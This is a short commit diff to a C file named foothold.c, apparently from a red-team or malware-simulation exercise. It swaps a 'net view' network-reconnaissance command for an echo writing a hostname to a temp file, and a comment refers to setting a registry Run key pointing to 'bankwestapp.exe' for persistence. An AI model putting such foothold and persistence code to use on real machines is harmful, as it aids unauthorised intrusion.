fb5c399e2c136c83afd0f0f19879d23b217f4324
lacouls <62086637+lacouls@users.noreply.github.com>
2025-03-14 15:24:12 +0800

    Update foothold.c

--- foothold.c
+++ foothold.c
@@ -36,7 +36,7 @@ int main()
     CloseHandle(hfile);
 
 //Create computer.txt content
-system("net view \\sauravwindowsvm > c:\\Users\\saurav\\Temp\\computer.txt");
+system("echo sauravwindowsvi > c:\\Users\\saurav\\Temp\\computer.txt");
     
 //Set registry runkey Value - point to bankwestapp.exe
 
